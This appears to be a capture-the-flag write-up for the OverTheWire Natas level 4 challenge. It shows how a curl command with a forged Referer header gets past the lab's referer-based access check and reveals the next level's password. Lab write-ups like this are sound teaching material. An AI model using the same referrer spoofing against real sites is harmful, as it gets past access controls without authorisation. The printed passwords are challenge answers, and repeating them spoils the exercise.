---
date: '2026-02-15'
description: we didn't move, the header did
draft: false
title: natas-4
weight: 5
ShowToc: false
---

| info | value |
|:-----|------:|
| user | `natas4` |
| pass | `QryZXc2e0zahULdHrtHxzyYkj59kUxLQ` |
| host | `http://natas4.natas.labs.overthewire.org` |

### explanation

we bump into an access disallowed response, telling us we are the wrong visitor

```html
<h1>natas4</h1>
<div id="content">
    Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"
    <br/>
    <div id="viewsource">
        <a href="index.php">Refresh page</a>
    </div>
</div>
```

while our string is empty & there is no literal way of refreshing a page in curl, we can simply change the
[referrer](https://everything.curl.dev/http/modify/referer.html) to pretend we are visiting from somewhere else, unlike directly clicking or accessing natas4. such behaviour is commonly known as [referrer spoofing](https://en.wikipedia.org/wiki/Referer_spoofing). you can also observe the http header inside the network tab upon inspecting request headers of `index.php`: `Referer: http://natas4.natas.labs.overthewire.org/index.php`

lets do so by changing our origin by passing the `-e`/`--referrer` parameter to the payload

```sh
curl http://natas4.natas.labs.overthewire.org \
-u natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ \
-e http://natas5.natas.labs.overthewire.org/
```

and voilà

```html
<h1>natas4</h1>
<div id="content">
    Access granted. The password for natas5 is 0n35PkggAPm2zbEpOU802c0x0Msn1ToK
    <br/>
    <div id="viewsource">
        <a href="index.php">Refresh page</a>
    </div>
</div>
```

